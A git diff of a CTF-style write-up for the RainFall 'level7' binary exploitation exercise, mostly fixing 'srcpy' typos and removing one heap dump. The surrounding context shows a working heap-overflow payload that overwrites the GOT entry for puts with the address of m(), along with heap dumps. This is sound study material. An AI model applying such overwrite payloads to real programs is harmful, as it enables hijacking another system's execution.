@@ -95,14 +95,14 @@ level7@RainFall:~$ ltrace ./level7 AAAAAAAA BBBBBBBB
   
   `./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')`
   
- Heap befor srcpy 1 
+ Heap befor strcpy 1 
 ```
 "--------------HEAP------------"
 0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
 0x804a010:	0x00000000	0x00000011	0x00000000	0x00000000
 0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038 
 ```
-  Heap after srcpy 1
+  Heap after strcpy 1
   ```
   "--------------HEAP------------"
 0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
@@ -122,15 +122,6 @@ puts@plt:
 0x80484f4 <m>:	0x83e58955
 ```
 
-
-
-```
-"-------HEAP-------"
-0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
-0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
-0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
-0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000
-```
   strcpy(0x0804a018, "AAAA")
   strcpy(0x0804a038, "BBBB")
   
@@ -139,7 +130,7 @@ puts@plt:
   
   what we need is smthing like:
   
-    strcpy(addr_of_puts, addr_of_m)
+   strcpy(addr_of_puts, addr_of_m)
   
   address of puts `0x8049928` and address of m() `0x080484f4`
   
